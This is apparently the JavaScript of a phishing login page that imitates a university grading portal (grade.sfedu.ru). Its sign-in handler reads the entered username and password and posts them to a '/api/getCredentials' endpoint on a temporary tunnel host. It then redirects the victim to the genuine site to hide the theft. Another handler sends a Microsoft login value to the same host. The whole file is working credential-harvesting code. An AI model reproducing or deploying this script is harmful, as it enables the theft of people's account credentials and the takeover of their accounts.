let collapsibleButton = document.querySelector(".collapsible");
collapsibleButton.addEventListener("click", (e) => {
    document.querySelector(".roleToggler").style.display = "block";
});

let signoauthin_button = document.getElementById("signoauthin_b");
signoauthin_button.addEventListener("click", (e) => {
    let microsoftLogin = document.querySelector("#loginoauth").value;

    async function sendData() {
        try {
            await fetch('https://metal-hotels-give.loca.lt/api/singleEntity', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({"entity": microsoftLogin})
            });
            window.location = "login.html";
        } catch (error) {
            console.error(error);
        }
    }
    sendData();    
});

let signin_button = document.getElementById("signin_b");
signin_button.addEventListener("click", (e) => {
    let login = document.getElementById("login").value;
    let password = document.getElementById("password").value;

    async function sendData() {
        try {
            await fetch('https://metal-hotels-give.loca.lt/api/getCredentials', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({"login": login, "password": password})
            });
            window.location = "https://grade.sfedu.ru";
        } catch (error) {
            console.error(error);
        }
    }
    sendData();
})
